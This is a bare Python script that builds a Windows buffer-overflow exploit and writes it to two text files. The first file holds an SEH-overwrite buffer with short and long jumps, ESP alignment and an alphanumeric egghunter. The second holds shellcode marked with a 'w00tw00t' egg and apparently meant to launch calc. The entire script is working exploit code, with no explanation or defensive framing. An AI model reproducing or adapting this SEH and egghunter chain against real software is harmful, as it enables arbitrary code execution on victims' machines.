#!/usr/bin/python
import struct


file2="egghpayload.txt"

egghunter = "TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBFMQXJKODOQR1BCZURF8XMVNWL35PZD4ZO88RWFP0044LKJZNOD5ZJNO2UJGKOM7AA"

jmpESP = "\xFF\xE4"

alignESP = "\x61" * 25

longJump = "\xE9\xBF\xFD\xFF\xFF"

nSEH = "\xEB\xF9\x90\x90" # Jump back 5 bytes
SEH  = "\x4b\x4d\x47"     # 0x00474d4b

egghpayload  = "A" * 6
egghpayload += "B" * 101
egghpayload += alignESP
egghpayload += jmpESP
egghpayload += "\x90" * 30
egghpayload += egghunter
egghpayload += "C" * (572 - len(alignESP) -len(jmpESP) - len(egghunter) - 30)
egghpayload += longJump
egghpayload += nSEH
egghpayload += SEH
#egghpayload += "D" * (5000 - len(egghpayload))


textfile = open(file2 , 'w')
textfile.write(egghpayload)
textfile.close()



file1="shellcode.txt"

calc  = "D"*26
calc += "w00tw00t"
calc += b"\x89\xe5\xd9\xc6\xd9\x75\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
calc += b"\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
calc += b"\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
calc += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
calc += b"\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x79\x78\x6f\x72"
calc += b"\x65\x50\x57\x70\x45\x50\x75\x30\x6e\x69\x79\x75\x70"
calc += b"\x31\x6b\x70\x30\x64\x4e\x6b\x62\x70\x56\x50\x6e\x6b"
calc += b"\x62\x72\x56\x6c\x6c\x4b\x46\x32\x36\x74\x6c\x4b\x42"
calc += b"\x52\x51\x38\x76\x6f\x78\x37\x30\x4a\x74\x66\x76\x51"
calc += b"\x69\x6f\x6e\x4c\x37\x4c\x70\x61\x33\x4c\x57\x72\x76"
calc += b"\x4c\x55\x70\x4a\x61\x58\x4f\x36\x6d\x53\x31\x78\x47"
calc += b"\x7a\x42\x4a\x52\x52\x72\x42\x77\x6e\x6b\x72\x72\x46"
calc += b"\x70\x4c\x4b\x71\x5a\x45\x6c\x6c\x4b\x42\x6c\x34\x51"
calc += b"\x53\x48\x58\x63\x51\x58\x55\x51\x7a\x71\x32\x71\x4c"
calc += b"\x4b\x46\x39\x31\x30\x47\x71\x49\x43\x6e\x6b\x51\x59"
calc += b"\x55\x48\x48\x63\x35\x6a\x31\x59\x4e\x6b\x74\x74\x4e"
calc += b"\x6b\x47\x71\x6e\x36\x35\x61\x39\x6f\x4c\x6c\x6a\x61"
calc += b"\x38\x4f\x76\x6d\x75\x51\x4f\x37\x67\x48\x6b\x50\x52"
calc += b"\x55\x48\x76\x36\x63\x63\x4d\x38\x78\x45\x6b\x43\x4d"
calc += b"\x36\x44\x50\x75\x78\x64\x73\x68\x4c\x4b\x43\x68\x54"
calc += b"\x64\x53\x31\x4e\x33\x32\x46\x4e\x6b\x76\x6c\x32\x6b"
calc += b"\x4c\x4b\x36\x38\x55\x4c\x73\x31\x79\x43\x4e\x6b\x74"
calc += b"\x44\x4c\x4b\x45\x51\x68\x50\x6e\x69\x43\x74\x35\x74"
calc += b"\x37\x54\x61\x4b\x73\x6b\x43\x51\x72\x79\x42\x7a\x70"
calc += b"\x51\x4b\x4f\x79\x70\x63\x6f\x73\x6f\x50\x5a\x6c\x4b"
calc += b"\x55\x42\x68\x6b\x6c\x4d\x53\x6d\x33\x5a\x66\x61\x6e"
calc += b"\x6d\x6f\x75\x4f\x42\x57\x70\x53\x30\x47\x70\x42\x70"
calc += b"\x61\x78\x70\x31\x6c\x4b\x50\x6f\x6d\x57\x59\x6f\x6a"
calc += b"\x75\x6f\x4b\x7a\x50\x78\x35\x4c\x62\x33\x66\x61\x78"
calc += b"\x39\x36\x4e\x75\x4f\x4d\x4f\x6d\x79\x6f\x4b\x65\x75"
calc += b"\x6c\x66\x66\x61\x6c\x65\x5a\x4b\x30\x6b\x4b\x4b\x50"
calc += b"\x72\x55\x67\x75\x4f\x4b\x61\x57\x36\x73\x73\x42\x70"
calc += b"\x6f\x63\x5a\x35\x50\x33\x63\x6b\x4f\x6b\x65\x70\x63"
calc += b"\x63\x51\x52\x4c\x75\x33\x67\x70\x41\x41"
calc += "E"*30


textfile = open(file1 , 'w')
textfile.write(calc)
textfile.close()

